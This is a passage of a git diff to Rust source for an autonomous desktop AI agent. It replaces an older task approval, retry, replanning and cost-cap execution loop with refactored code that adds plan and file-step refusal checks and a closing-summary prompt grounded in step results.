-                        tokio::spawn(async move {
-                            let controller = app_handle_clone.state::<ApprovalController>();
-                            let resolution = match tokio::time::timeout(
-                                Duration::from_secs(APPROVAL_TIMEOUT_SECS),
-                                controller.request_approval(&app_handle_clone, payload),
-                            )
-                            .await
-                            {
-                                Ok(Ok(res)) => res,
-                                Ok(Err(e)) => {
-                                    tracing::warn!(
-                                        "[Agent] ApprovalController error for task {}: {}",
-                                        approval_task_id,
-                                        e
-                                    );
-                                    ApprovalResolution::Rejected {
-                                        reason: Some(format!("Approval request failed: {}", e)),
-                                    }
-                                }
-                                Err(_) => {
-                                    tracing::warn!(
-                                        "[Agent] Approval timeout ({}s) for task {}",
-                                        APPROVAL_TIMEOUT_SECS,
-                                        approval_task_id
-                                    );
-                                    ApprovalResolution::Rejected {
-                                        reason: Some(format!(
-                                            "Approval timed out after {}s",
-                                            APPROVAL_TIMEOUT_SECS
-                                        )),
-                                    }
-                                }
-                            };
-
-                            match resolution {
-                                ApprovalResolution::Approved { .. } => {
-                                    tracing::info!(
-                                        "[Agent] Task {} approved via ApprovalController, resuming",
-                                        approval_task_id
-                                    );
-                                    {
-                                        let mut queue = task_queue.lock();
-                                        if let Some(t) =
-                                            queue.iter_mut().find(|t| t.id == approval_task_id)
-                                        {
-                                            t.status = TaskStatus::Planning;
-                                        }
-                                    }
-                                    if let Err(e) =
-                                        agent_clone.execute_task(approval_task_id.clone()).await
-                                    {
-                                        tracing::error!(
-                                            "[Agent] Task {} failed after approval: {}",
-                                            approval_task_id,
-                                            e
-                                        );
-                                        running_tasks.lock().retain(|id| id != &approval_task_id);
-                                    }
-                                }
-                                ApprovalResolution::Rejected { reason } => {
-                                    let reason_msg = reason
-                                        .unwrap_or_else(|| "User rejected the task".to_string());
-                                    tracing::info!(
-                                        "[Agent] Task {} rejected: {}",
-                                        approval_task_id,
-                                        reason_msg
-                                    );
-                                    {
-                                        let mut queue = task_queue.lock();
-                                        if let Some(t) =
-                                            queue.iter_mut().find(|t| t.id == approval_task_id)
-                                        {
-                                            t.status = TaskStatus::Failed(format!(
-                                                "Approval denied: {}",
-                                                reason_msg
-                                            ));
-                                        }
-                                    }
-                                    running_tasks.lock().retain(|id| id != &approval_task_id);
-                                    task_notify.notify_waiters();
-                                }
-                            }
-                        });
-                    } else {
-                        // No app_handle or ApprovalController not available --
-                        // fall back to PENDING_TASK_APPROVALS oneshot channel
-                        // for backward compatibility.
-                        tracing::info!(
-                            "[Agent] ApprovalController unavailable for task {}, using legacy approval flow",
-                            task_id
-                        );
-                        let (tx, rx) = oneshot::channel::<bool>();
-                        PENDING_TASK_APPROVALS.insert(task_id.clone(), tx);
-
-                        if let Some(ref handle) = self.app_handle {
-                            if let Err(e) = handle.emit(
-                                "agent:task_approval_required",
-                                json!({
-                                    "taskId": task_id,
-                                    "description": task.description,
-                                }),
-                            ) {
-                                tracing::warn!(
-                                    "Failed to emit agent:task_approval_required: {}",
-                                    e
-                                );
-                            }
-                        }
-
-                        let agent_clone = self.clone_for_task()?;
-                        let approval_task_id = task_id.clone();
-                        self.running_tasks.lock().push(task_id);
-
-                        tokio::spawn(async move {
-                            let approved = match tokio::time::timeout(
-                                Duration::from_secs(APPROVAL_TIMEOUT_SECS),
-                                rx,
-                            )
-                            .await
-                            {
-                                Ok(Ok(v)) => v,
-                                Ok(Err(_)) => {
-                                    tracing::warn!(
-                                        "[Agent] Approval channel dropped for task {}",
-                                        approval_task_id
-                                    );
-                                    false
-                                }
-                                Err(_) => {
-                                    PENDING_TASK_APPROVALS.remove(&approval_task_id);
-                                    tracing::warn!(
-                                        "[Agent] Approval timeout ({}s) for task {}",
-                                        APPROVAL_TIMEOUT_SECS,
-                                        approval_task_id
-                                    );
-                                    false
-                                }
-                            };
-
-                            if approved {
-                                tracing::info!(
-                                    "[Agent] Task {} approved, resuming execution",
-                                    approval_task_id
-                                );
-                                {
-                                    let mut queue = agent_clone.task_queue.lock();
-                                    if let Some(t) =
-                                        queue.iter_mut().find(|t| t.id == approval_task_id)
-                                    {
-                                        t.status = TaskStatus::Planning;
-                                    }
-                                }
-                                if let Err(e) =
-                                    agent_clone.execute_task(approval_task_id.clone()).await
-                                {
-                                    tracing::error!(
-                                        "[Agent] Task {} failed after approval: {}",
-                                        approval_task_id,
-                                        e
-                                    );
-                                    agent_clone
-                                        .running_tasks
-                                        .lock()
-                                        .retain(|id| id != &approval_task_id);
-                                }
-                            } else {
-                                tracing::info!(
-                                    "[Agent] Task {} rejected or timed out",
-                                    approval_task_id
-                                );
-                                {
-                                    let mut queue = agent_clone.task_queue.lock();
-                                    if let Some(t) =
-                                        queue.iter_mut().find(|t| t.id == approval_task_id)
-                                    {
-                                        t.status = TaskStatus::Failed(
-                                            "Task approval denied or timed out".to_string(),
-                                        );
-                                    }
-                                }
-                                agent_clone
-                                    .running_tasks
-                                    .lock()
-                                    .retain(|id| id != &approval_task_id);
-                            }
-                        });
-                    }
-
-                    return Ok(());
-                }
-            }
-        }
-
-        let agent_clone = self.clone_for_task()?;
-
-        // Push task_id to running_tasks AFTER clone_for_task succeeds to avoid
-        // leaking a slot if clone_for_task fails.
-        self.running_tasks.lock().push(task_id.clone());
-        let task_id_clone = task_id;
-        tokio::spawn(async move {
-            if let Err(e) = agent_clone.execute_task(task_id_clone.clone()).await {
-                tracing::error!("[Agent] Task execution failed: {}", e);
-                // Clean up running_tasks slot on error (mirrors the approval path)
-                agent_clone
-                    .running_tasks
-                    .lock()
-                    .retain(|id| id != &task_id_clone);
-            }
-        });
-
-        Ok(())
-    }
-
-    pub async fn execute_task(&self, task_id: String) -> Result<()> {
-        let mut task = {
-            let mut queue = self.task_queue.lock();
-            queue
-                .iter_mut()
-                .find(|t| t.id == task_id)
-                .ok_or_else(|| anyhow!("Task {} not found", task_id))?
-                .clone()
-        };
-
-        task.status = TaskStatus::Executing;
-        tracing::info!("[Agent] Executing task {}: {}", task_id, task.description);
-
-        // Pre-validate vision capabilities for all steps before execution begins.
-        // This catches OCR-dependent steps early (at task start) instead of
-        // discovering the capability gap mid-execution after wasting LLM calls.
-        for (idx, step) in task.steps.iter().enumerate() {
-            if let Err(e) = super::vision::VisionAutomation::check_vision_capability(&step.action) {
-                tracing::warn!(
-                    "[Agent] Task {} step {} requires unavailable vision capability: {}",
-                    task_id,
-                    idx,
-                    e
-                );
-                task.status = TaskStatus::Failed(format!(
-                    "Step {} ({}) requires unavailable vision capability: {}",
-                    idx, step.description, e
-                ));
-                // Update the task in the queue with the failure status.
-                let mut queue = self.task_queue.lock();
-                if let Some(t) = queue.iter_mut().find(|t| t.id == task_id) {
-                    *t = task;
-                }
-                return Err(e);
-            }
-        }
-
-        // P1: Capture cost before this task starts for per-task cost cap enforcement
-        let cost_before_task = self.router.read().await.get_cumulative_cost();
-
-        // Track completed step summaries for replanning context
-        let mut completed_summaries: Vec<String> = Vec::new();
-
-        // H3 fix: Track step outcomes (description + result) for LLM feedback loop.
-        // After each successful step, the LLM is consulted with the full execution
-        // history so it can adjust remaining steps based on actual tool output.
-        let mut step_outcomes: Vec<StepOutcome> = Vec::new();
-
-        let mut step_index = 0usize;
-
-        // ISSUE-10 fix: Fail early if the planner produced zero steps.
-        if task.steps.is_empty() {
-            tracing::warn!("[Agent] Task {} has no steps after planning", task.id);
-            task.status = TaskStatus::Failed("Task has no steps after planning".to_string());
-            let mut queue = self.task_queue.lock();
-            if let Some(t) = queue.iter_mut().find(|t| t.id == task_id) {
-                *t = task.clone();
-            }
-            self.running_tasks.lock().retain(|id| id != &task_id);
-            self.task_notify.notify_waiters();
-            return Err(anyhow!("Task {} has no steps after planning", task_id));
-        }
-
-        while step_index < task.steps.len() {
-            // ISSUE-02 fix: Fetch step at the top of the outer loop but ALSO
-            // re-fetch inside the attempt loop after replanning. We keep this
-            // initial clone for the pre-loop budget check and event emission.
-            let step = task.steps[step_index].clone();
-            let total_steps = task.steps.len();
-            task.current_step = step_index;
-            task.updated_at = std::time::Instant::now();
-
-            // Pre-step budget gate: check cumulative cost BEFORE making the next LLM call.
-            let pre_step_cost = self.router.read().await.get_cumulative_cost();
-            let task_cost_so_far = pre_step_cost - cost_before_task;
-            if task_cost_so_far > self.config.max_cost_per_task {
-                task.status = TaskStatus::Failed(format!(
-                    "Task cost cap exceeded before step {}: ${:.2} > ${:.2} limit",
-                    step_index, task_cost_so_far, self.config.max_cost_per_task
-                ));
-                tracing::warn!(
-                    "[Agent] Task {} budget gate: ${:.2} exceeds per-task cap ${:.2} before step {}",
-                    task_id,
-                    task_cost_so_far,
-                    self.config.max_cost_per_task,
-                    step_index
-                );
-                break;
-            }
-            if pre_step_cost > self.config.effective_session_cap_usd() {
-                task.status = TaskStatus::Failed(format!(
-                    "Session cost cap exceeded before step {}: ${:.2} > ${:.2} limit",
-                    step_index,
-                    pre_step_cost,
-                    self.config.effective_session_cap_usd()
-                ));
-                tracing::warn!(
-                    "[Agent] Task {} budget gate: session cost ${:.2} exceeds cap ${:.2} before step {}",
-                    task_id,
-                    pre_step_cost,
-                    self.config.effective_session_cap_usd(),
-                    step_index
-                );
-                break;
-            }
-
-            // BUG-02 fix: emit step-started event to frontend
-            if let Some(ref handle) = self.app_handle {
-                if let Err(e) = handle.emit(
-                    "agent:step-started",
-                    json!({
-                        "taskId": task.id,
-                        "step": step.description,
-                        "stepIndex": step_index,
-                        "totalSteps": total_steps
-                    }),
-                ) {
-                    tracing::warn!("Failed to emit agent:step-started: {}", e);
-                }
-            }
-
-            {
-                let mut queue = self.task_queue.lock();
-                if let Some(t) = queue.iter_mut().find(|t| t.id == task_id) {
-                    *t = task.clone();
-                }
-            }
-
-            let mut attempt = 0usize;
-            let mut step_succeeded = false;
-            loop {
-                attempt += 1;
-                // ISSUE-02 fix: Re-fetch the step from task.steps each attempt
-                // so we always execute the current step, not a stale clone from
-                // before a replan modified task.steps.
-                let step = task.steps[step_index].clone();
-                let step_result = self.executor.execute_step(&step, &self.vision).await;
-
-                match step_result {
-                    Ok(result) if result.success => {
-                        let result_text = result.result.as_deref().unwrap_or("OK").to_string();
-                        tracing::info!("[Agent] Step {} completed: {}", step.id, result_text);
-                        // BUG-02 fix: emit step-completed event to frontend
-                        if let Some(ref handle) = self.app_handle {
-                            if let Err(e) = handle.emit(
-                                "agent:step-completed",
-                                json!({
-                                    "taskId": task.id,
-                                    "step": step.description,
-                                    "result": result_text,
-                                    "stepIndex": step_index
-                                }),
-                            ) {
-                                tracing::warn!("Failed to emit agent:step-completed: {}", e);
-                            }
-                        }
-                        completed_summaries.push(format!("{}: {}", step.id, step.description));
-
-                        // H3 fix: record the step outcome for LLM feedback
-                        step_outcomes.push(StepOutcome {
-                            step_id: step.id.clone(),
-                            description: step.description.clone(),
-                            result: result_text,
-                        });
-
-                        step_succeeded = true;
-                        break;
-                    }
-                    Ok(result) => {
-                        let error_msg = result
-                            .error
-                            .as_deref()
-                            .unwrap_or("Unknown error")
-                            .to_string();
-                        let will_retry =
-                            task.retry_count < task.max_retries && attempt <= MAX_SELF_HEAL_RETRIES;
-                        tracing::warn!("[Agent] Step {} failed: {}", step.id, error_msg);
-                        // BUG-02 fix: emit step-failed event to frontend
-                        if let Some(ref handle) = self.app_handle {
-                            if let Err(e) = handle.emit(
-                                "agent:step-failed",
-                                json!({
-                                    "taskId": task.id,
-                                    "step": step.description,
-                                    "error": error_msg,
-                                    "attempt": attempt,
-                                    "retrying": will_retry
-                                }),
-                            ) {
-                                tracing::warn!("Failed to emit agent:step-failed: {}", e);
-                            }
-                        }
-                        if will_retry {
-                            task.retry_count += 1;
-
-                            // BUG-01 fix: On the 2nd retry attempt, ask the LLM
-                            // to replan instead of blindly retrying the same step.
-                            if attempt == 2 && task.replan_count < MAX_REPLAN_COUNT {
-                                match self
-                                    .replan_on_failure(
-                                        &step.description,
-                                        &error_msg,
-                                        &completed_summaries,
-                                        &task.description,
-                                    )
-                                    .await
-                                {
-                                    Ok(new_steps) => {
-                                        if new_steps.is_empty() {
-                                            tracing::warn!("[Agent] Replan returned 0 steps, falling back to blind retry");
-                                            continue;
-                                        }
-                                        tracing::info!(
-                                            "[Agent] Replan succeeded ({} new steps, replan {}/{})",
-                                            new_steps.len(),
-                                            task.replan_count + 1,
-                                            MAX_REPLAN_COUNT
-                                        );
-                                        task.steps.truncate(step_index);
-                                        task.steps.extend(new_steps);
-                                        task.retry_count = 0;
-                                        task.replan_count += 1;
-                                        // ISSUE-01 fix: Bounds check after replan.
-                                        // if new steps didn't actually add anything
-                                        // at step_index, fail instead of OOB access.
-                                        if task.steps.len() <= step_index {
-                                            tracing::error!(
-                                                "[Agent] Replan produced no executable steps at index {} (total {}), failing task",
-                                                step_index, task.steps.len()
-                                            );
-                                            task.status = TaskStatus::Failed(format!(
-                                                "Replan produced no executable steps at index {} (total steps: {})",
-                                                step_index, task.steps.len()
-                                            ));
-                                            break;
-                                        }
-                                        // Break inner loop; outer while-loop will
-                                        // pick up the first replanned step at step_index.
-                                        break;
-                                    }
-                                    Err(e) => {
-                                        tracing::warn!(
-                                            "[Agent] Replan failed ({}), falling back to blind retry",
-                                            e
-                                        );
-                                        continue;
-                                    }
-                                }
-                            }
-
-                            tracing::info!(
-                                "[Agent] Self-correcting step {} (attempt {}/{})",
-                                step.id,
-                                attempt,
-                                MAX_SELF_HEAL_RETRIES
-                            );
-                            continue;
-                        } else {
-                            task.status = TaskStatus::Failed(format!(
-                                "Step {} failed: {}",
-                                step.id, error_msg
-                            ));
-                            break;
-                        }
-                    }
-                    Err(e) => {
-                        let error_msg = e.to_string();
-                        let will_retry =
-                            task.retry_count < task.max_retries && attempt <= MAX_SELF_HEAL_RETRIES;
-                        tracing::error!("[Agent] Step {} error: {}", step.id, error_msg);
-                        // BUG-02 fix: emit step-failed event to frontend
-                        if let Some(ref handle) = self.app_handle {
-                            if let Err(e) = handle.emit(
-                                "agent:step-failed",
-                                json!({
-                                    "taskId": task.id,
-                                    "step": step.description,
-                                    "error": error_msg,
-                                    "attempt": attempt,
-                                    "retrying": will_retry
-                                }),
-                            ) {
-                                tracing::warn!("Failed to emit agent:step-failed: {}", e);
-                            }
-                        }
-                        if will_retry {
-                            task.retry_count += 1;
-
-                            // BUG-01 fix: On the 2nd retry attempt, ask the LLM
-                            // to replan instead of blindly retrying the same step.
-                            if attempt == 2 && task.replan_count < MAX_REPLAN_COUNT {
-                                match self
-                                    .replan_on_failure(
-                                        &step.description,
-                                        &error_msg,
-                                        &completed_summaries,
-                                        &task.description,
-                                    )
-                                    .await
-                                {
-                                    Ok(new_steps) => {
-                                        if new_steps.is_empty() {
-                                            tracing::warn!("[Agent] Replan returned 0 steps, falling back to blind retry");
-                                            continue;
-                                        }
-                                        tracing::info!(
-                                            "[Agent] Replan succeeded ({} new steps, replan {}/{})",
-                                            new_steps.len(),
-                                            task.replan_count + 1,
-                                            MAX_REPLAN_COUNT
-                                        );
-                                        task.steps.truncate(step_index);
-                                        task.steps.extend(new_steps);
-                                        task.retry_count = 0;
-                                        task.replan_count += 1;
-                                        // ISSUE-01 fix: Bounds check after replan
-                                        if task.steps.len() <= step_index {
-                                            tracing::error!(
-                                                "[Agent] Replan produced no executable steps at index {} (total {}), failing task",
-                                                step_index, task.steps.len()
-                                            );
-                                            task.status = TaskStatus::Failed(format!(
-                                                "Replan produced no executable steps at index {} (total steps: {})",
-                                                step_index, task.steps.len()
-                                            ));
-                                            break;
-                                        }
-                                        break;
-                                    }
-                                    Err(replan_err) => {
-                                        tracing::warn!(
-                                            "[Agent] Replan failed ({}), falling back to blind retry",
-                                            replan_err
-                                        );
-                                        continue;
-                                    }
-                                }
-                            }
-
-                            tracing::warn!(
-                                "[Agent] Retrying step {} after error (attempt {}/{})",
-                                step.id,
-                                attempt,
-                                MAX_SELF_HEAL_RETRIES
-                            );
-                            continue;
-                        } else {
-                            task.status = TaskStatus::Failed(error_msg);
-                            break;
-                        }
-                    }
-                }
-            }
-
-            if matches!(task.status, TaskStatus::Failed(_)) {
-                break;
-            }
-
-            // P1: Check cost caps after each successful step
-            if step_succeeded {
-                let current_cost = self.router.read().await.get_cumulative_cost();
-                let task_cost = current_cost - cost_before_task;
-                if task_cost > self.config.max_cost_per_task {
-                    task.status = TaskStatus::Failed(format!(
-                        "Task cost cap exceeded: ${:.2} > ${:.2} limit",
-                        task_cost, self.config.max_cost_per_task
-                    ));
-                    tracing::warn!(
-                        "[Agent] Task {} aborted: cost ${:.2} exceeds per-task cap ${:.2}",
-                        task_id,
-                        task_cost,
-                        self.config.max_cost_per_task
-                    );
-                    break;
-                }
-                if current_cost > self.config.effective_session_cap_usd() {
-                    task.status = TaskStatus::Failed(format!(
-                        "Session cost cap exceeded: ${:.2} > ${:.2} limit",
-                        current_cost,
-                        self.config.effective_session_cap_usd()
-                    ));
-                    tracing::warn!(
-                        "[Agent] Task {} aborted: session cost ${:.2} exceeds cap ${:.2}",
-                        task_id,
-                        current_cost,
-                        self.config.effective_session_cap_usd()
-                    );
-                    break;
-                }
-            }
-
-            // H3 fix: After a successful step, feed the result back to the LLM
-            // so it can adjust remaining steps based on actual tool output.
-            // Only consult if there are remaining steps to potentially revise.
-            if step_succeeded && step_index + 1 < task.steps.len() {
-                match self
-                    .consult_llm_after_step(
-                        &task.description,
-                        &step_outcomes,
-                        &task.steps[step_index + 1..],
-                    )
-                    .await
-                {
-                    Ok(Some(revised_steps)) => {
-                        if !revised_steps.is_empty() {
-                            tracing::info!(
-                                "[Agent] LLM feedback revised remaining plan: {} steps (was {})",
-                                revised_steps.len(),
-                                task.steps.len() - step_index - 1
-                            );
-                            task.steps.truncate(step_index + 1);
-                            task.steps.extend(revised_steps);
-                        }
-                    }
-                    Ok(None) => {
-                        // LLM confirmed the existing plan is fine, continue as-is
-                    }
-                    Err(e) => {
-                        // Non-fatal: if the feedback call fails, continue with
-                        // the original plan rather than aborting the task.
-                        tracing::warn!(
-                            "[Agent] LLM feedback consultation failed ({}), continuing with original plan",
-                            e
-                        );
-                    }
-                }
-            }
-
-            // Only advance to next step if the current step actually succeeded.
-            // If we broke out of the inner loop due to replanning, step_succeeded
-            // will be false and we re-execute at the same step_index (which now
-            // points to the first replanned step).
-            if step_succeeded {
-                step_index += 1;
-
-                // P5D: Save a checkpoint after each successful step so the task
-                // can be resumed if the app restarts or the user pauses.
-                if let Some(ref storage) = self.task_storage {
-                    let current_cost = self.router.read().await.get_cumulative_cost();
-                    let steps_json = serde_json::to_string(&task.steps).unwrap_or_default();
-                    let summaries_json =
-                        serde_json::to_string(&completed_summaries).unwrap_or_default();
-                    let checkpoint = AutonomousTaskCheckpoint::new(
-                        task.id.clone(),
-                        task.description.clone(),
-                        steps_json,
-                        step_index as i32,
-                        task.steps.len() as i32,
-                        task.retry_count as i32,
-                        task.replan_count as i32,
-                        task.auto_approve,
-                        current_cost - cost_before_task,
-                        summaries_json,
-                        "[]".to_string(),
-                        "executing".to_string(),
-                    );
-                    if let Err(e) = storage.save_autonomous_checkpoint(&checkpoint) {
-                        tracing::warn!(
-                            "[Agent] Failed to save autonomous checkpoint for task {}: {}",
-                            task_id,
-                            e
-                        );
-                    } else {
-                        tracing::debug!(
-                            "[Agent] Checkpoint saved for task {} at step {}/{}",
-                            task_id,
-                            step_index,
-                            task.steps.len()
-                        );
-                    }
-                }
-            }
-
-            sleep(Duration::from_millis(75)).await;
-        }
-
-        // BUG-02 fix: count completed steps for the task-completed event
-        let completed_count = if task.status == TaskStatus::Executing {
-            task.steps.len()
-        } else {
-            task.current_step
-        };
-
-        if task.status == TaskStatus::Executing {
-            task.status = TaskStatus::Completed;
-        }
-
-        // BUG-02 fix: emit task-completed or task-failed event to frontend
-        if let Some(ref handle) = self.app_handle {
-            let emit_result = match &task.status {
-                TaskStatus::Completed => handle.emit(
+        match end {
+            Drive::Done => {
+                task.status = TaskStatus::Completed;
+                self.emit(
                     "agent:task-completed",
                     json!({
                         "taskId": task.id,
                         "success": true,
-                        "stepsCompleted": completed_count
+                        "stepsCompleted": state.outcomes.len()
                     }),
-                ),
-                TaskStatus::Failed(error_message) => handle.emit(
-                    "agent:task-failed",
-                    json!({
-                        "taskId": task.id,
-                        "error": error_message
-                    }),
-                ),
-                _ => Ok(()),
-            };
-            if let Err(e) = emit_result {
-                tracing::warn!("Failed to emit agent task status event: {}", e);
+                );
+                let summary = self
+                    .closing_summary(&task.description, &state.outcomes, control, &limits)
+                    .await;
+                RunEnd::Completed(RunReport {
+                    summary,
+                    steps: reported_steps(&state.outcomes),
+                    notes: state.notes,
+                })
             }
-        }
-
-        {
-            let mut queue = self.task_queue.lock();
-            if let Some(t) = queue.iter_mut().find(|t| t.id == task_id) {
-                // TOCTOU guard: only write back if the in-queue task's status
-                // hasn't been mutated concurrently (e.g. by an approval handler).
-                // If someone else changed the status while we were executing,
-                // preserve their update instead of blindly overwriting.
-                let status_unchanged = std::mem::discriminant(&t.status)
-                    == std::mem::discriminant(&TaskStatus::Executing)
-                    || std::mem::discriminant(&t.status)
-                        == std::mem::discriminant(&TaskStatus::Planning);
-                if status_unchanged {
-                    *t = task.clone();
-                } else {
-                    tracing::info!(
-                        "[Agent] Task {} status was concurrently changed to {:?}, skipping write-back",
-                        task_id,
-                        t.status
-                    );
+            Drive::Failed(mut reason) => {
+                for note in &state.notes {
+                    reason.push('\n');
+                    reason.push_str(note);
                 }
+                task.status = TaskStatus::Failed(reason.clone());
+                self.emit(
+                    "agent:task-failed",
+                    json!({ "taskId": task.id, "error": reason }),
+                );
+                RunEnd::Failed(reason)
+            }
+            Drive::Stopped(reason) => {
+                task.status = TaskStatus::Cancelled;
+                RunEnd::Stopped(reason)
             }
         }
+    }
 
-        self.running_tasks.lock().retain(|id| id != &task_id);
-
-        // Wake any `run_goal` waiters now that this task reached a terminal state.
-        self.task_notify.notify_waiters();
-
-        // BUG-05 fix: evict old terminal tasks to prevent unbounded task_queue growth.
-        // Keep the 50 most-recently completed/failed tasks for status queries; anything
-        // beyond that is evicted oldest-first.
-        {
-            const MAX_TERMINAL_TASKS: usize = 50;
-            let mut queue = self.task_queue.lock();
-            let terminal_count = queue
-                .iter()
-                .filter(|t| matches!(t.status, TaskStatus::Completed | TaskStatus::Failed(_)))
-                .count();
-            if terminal_count > MAX_TERMINAL_TASKS {
-                let to_remove = terminal_count - MAX_TERMINAL_TASKS;
-                let mut removed = 0;
-                queue.retain(|t| {
-                    if removed < to_remove
-                        && matches!(t.status, TaskStatus::Completed | TaskStatus::Failed(_))
-                    {
-                        removed += 1;
-                        false
-                    } else {
-                        true
-                    }
-                });
+    /// Why the plan cannot start as planned, if it cannot.
+    fn plan_refusal(&self, task: &Task) -> Option<String> {
+        if task.steps.is_empty() {
+            return Some("The plan had no steps, so there was nothing to run.".to_string());
+        }
+        for (index, step) in task.steps.iter().enumerate() {
+            if let Err(error) = VisionAutomation::check_vision_capability(&step.action) {
+                return Some(format!(
+                    "Step {} ({}) requires unavailable vision capability: {}",
+                    index, step.description, error
+                ));
             }
         }
+        let refusals = unattended_plan_refusals(self.app_handle.as_ref(), &task.steps);
+        (!refusals.is_empty()).then(|| refusals.join("\n"))
+    }
 
-        tracing::info!(
-            "[Agent] Task {} completed with status: {:?}",
-            task_id,
-            task.status
+    /// The run's result in the model's own words: what it did and what it
+    /// found, from the steps' outputs. The plan has no step that writes an
+    /// answer, so this is one last model call, made only while the run is
+    /// inside its spending limit. When it cannot be had, the last step's own
+    /// output stands in.
+    async fn closing_summary(
+        &self,
+        goal: &str,
+        outcomes: &[StepOutcome],
+        control: &RunControl,
+        limits: &RunLimits,
+    ) -> String {
+        if self.spend().await - limits.spend_at_start > limits.spend_cap {
+            return fallback_summary(outcomes);
+        }
+        let history: Vec<String> = outcomes[outcomes.len().saturating_sub(MAX_FEEDBACK_HISTORY)..]
+            .iter()
+            .map(|outcome| format!("- {}\n  Result: {}", outcome.description, outcome.result))
+            .collect();
+        let prompt = format!(
+            r#"You ran a task for someone who was not watching. Write what they need to read now: what you did and what you found, in a few plain sentences. Use only the step results below; if a result is missing or empty, say so instead of guessing. Do not repeat the goal back.
+
+Goal: "{goal}"
+
+Steps and their results:
+{history}"#,
+            goal = goal,
+            history = history.join("\n"),
         );
-        Ok(())
+
+        let answer = control
+            .unless_stopped(async {
+                self.router
+                    .read()
+                    .await
+                    .send_message(&prompt, Some(self.model_route()))
+                    .await
+            })
+            .await;
+        match answer {
+            Ok(Ok(summary)) if !summary.trim().is_empty() => bounded_output(summary.trim()),
+            Ok(Ok(_)) | Err(_) => fallback_summary(outcomes),
+            Ok(Err(error)) => {
+                tracing::warn!("[Agent] Closing summary failed: {}", error);
+                fallback_summary(outcomes)
+            }
+        }
     }
 
     /// BUG-01 fix: Ask the LLM to produce revised steps when a step fails on
@@ -1292,7 +767,7 @@ Be concise."#,
             .router
             .read()
             .await
-            .send_message(&prompt, None)
+            .send_message(&prompt, Some(self.model_route()))
             .await
             .map_err(|e| anyhow!("LLM replan request failed: {}", e))?;
 
@@ -1362,7 +837,7 @@ Use the same action types: Screenshot, Click, Type, Navigate, WaitForElement, Ex
             .router
             .read()
             .await
-            .send_message(&prompt, None)
+            .send_message(&prompt, Some(self.model_route()))
             .await
             .map_err(|e| anyhow!("LLM feedback consultation failed: {}", e))?;
 
@@ -1393,227 +868,923 @@ Use the same action types: Screenshot, Click, Type, Navigate, WaitForElement, Ex
         }
     }
 
-    async fn check_resource_limits(&self, sys: &mut System) -> Result<bool> {
-        // Refresh only CPU, memory, and the current process, avoids the full
-        // process/disk scan of new_all() + refresh_all() on every iteration.
-        sys.refresh_cpu();
-        sys.refresh_memory();
-
-        let current_pid =
-            sysinfo::get_current_pid().map_err(|e| anyhow!("Failed to get current PID: {}", e))?;
-        sys.refresh_process(current_pid);
-
-        let cpu_usage = sys.global_cpu_info().cpu_usage() as f64;
-        if cpu_usage > self.config.cpu_limit_percent {
-            tracing::warn!(
-                "[Agent] CPU usage ({:.1}%) exceeds limit ({:.1}%)",
-                cpu_usage,
-                self.config.cpu_limit_percent
-            );
-            return Ok(false);
+    /// Holds a file step to the granted folders and the secrets denylist.
+    /// This is the only place granted folders are decided for an agent step:
+    /// the executor applies every other path rule and relies on this running
+    /// before each `execute_step`.
+    async fn file_step_refusal(&self, action: &Action) -> Option<String> {
+        if !matches!(action, Action::ReadFile { .. } | Action::WriteFile { .. }) {
+            return None;
         }
+        if let Some(refusal) = relative_path_refusal(action) {
+            return Some(refusal);
+        }
+        match granted_folders_for(self.app_handle.as_ref(), &[]).await {
+            Ok(granted) => file_step_refusal_in(&granted, action),
+            Err(no_folders) => Some(no_folders.to_string()),
+        }
+    }
+}
 
-        if let Some(process) = sys.process(current_pid) {
-            let memory_mb = process.memory() / (1024 * 1024);
-            if memory_mb > self.config.memory_limit_mb {
-                tracing::warn!(
-                    "[Agent] Memory usage ({}MB) exceeds limit ({}MB)",
-                    memory_mb,
-                    self.config.memory_limit_mb
-                );
-                return Ok(false);
+#[async_trait]
+impl RunHost for AutonomousAgent {
+    fn emit(&self, event: &str, payload: serde_json::Value) {
+        if let Some(ref handle) = self.app_handle {
+            if let Err(error) = handle.emit(event, payload) {
+                tracing::warn!("Failed to emit {}: {}", event, error);
             }
         }
+    }
 
-        let cpu_usage = sys.global_cpu_info().cpu_usage();
-        let used_memory = sys.used_memory();
-        let total_memory = sys.total_memory();
-        let memory_percent = (used_memory as f64 / total_memory as f64) * 100.0;
-        if memory_percent > 80.0 {
-            tracing::warn!(
-                "Memory usage high: {:.1}%, throttling autonomous agent",
-                memory_percent
-            );
-            return Ok(false);
+    async fn in_project(&self, step: TaskStep) -> TaskStep {
+        let action = match &self.working_folder {
+            Some(folder) => executor::step_in_folder(&step.action, Some(folder.as_path())),
+            None => executor::step_in_project(self.app_handle.as_ref(), &step.action).await,
+        };
+        TaskStep { action, ..step }
+    }
+
+    async fn refusal(&self, action: &Action) -> Option<String> {
+        match unattended_refusal(self.app_handle.as_ref(), action) {
+            Some(refusal) => Some(refusal),
+            None => self.file_step_refusal(action).await,
         }
-
-        tracing::debug!(
-            "Resource check passed: CPU {:.1}%, Memory {:.1}%",
-            cpu_usage,
-            memory_percent
-        );
-        Ok(true)
     }
 
-    /// Clone agent state for spawning a parallel task.
-    /// Returns Result instead of panicking if component creation fails.
-    pub fn clone_for_task(&self) -> Result<Self> {
-        Ok(Self {
-            config: self.config.clone(),
-            automation: self.automation.clone(),
-            router: self.router.clone(),
-            planner: TaskPlanner::new(self.router.clone())
-                .map_err(|e| anyhow!("TaskPlanner creation failed: {}", e))?,
-            executor: TaskExecutor::new(self.automation.clone(), self.browser_bridge.clone())
-                .map_err(|e| anyhow!("TaskExecutor creation failed: {}", e))?,
-            vision: VisionAutomation::new()
-                .map_err(|e| anyhow!("VisionAutomation creation failed: {}", e))?,
-            approval: ApprovalManager::new(self.config.clone()),
-            task_queue: self.task_queue.clone(),
-            running_tasks: self.running_tasks.clone(),
-            stop_signal: self.stop_signal.clone(),
-            task_notify: self.task_notify.clone(),
-            app_handle: self.app_handle.clone(),
-            task_storage: self.task_storage.clone(),
-            browser_bridge: self.browser_bridge.clone(),
-        })
+    fn revision_refusal(&self, revisions_so_far: usize, revised: &[TaskStep]) -> Option<String> {
+        revision_refusal(self.app_handle.as_ref(), revisions_so_far, revised)
     }
 
-    /// Resume a task from a previously saved autonomous checkpoint.
-    ///
-    /// Reconstructs the Task from checkpoint data, inserts it into the task queue
-    /// at the checkpoint's step index, and begins execution from there.
-    pub async fn resume_from_checkpoint(
+    async fn run_step(&self, step: &TaskStep) -> Result<StepResult> {
+        self.executor.execute_step(step, &self.vision).await
+    }
+
+    async fn replan(
         &self,
-        checkpoint: &AutonomousTaskCheckpoint,
-    ) -> Result<String> {
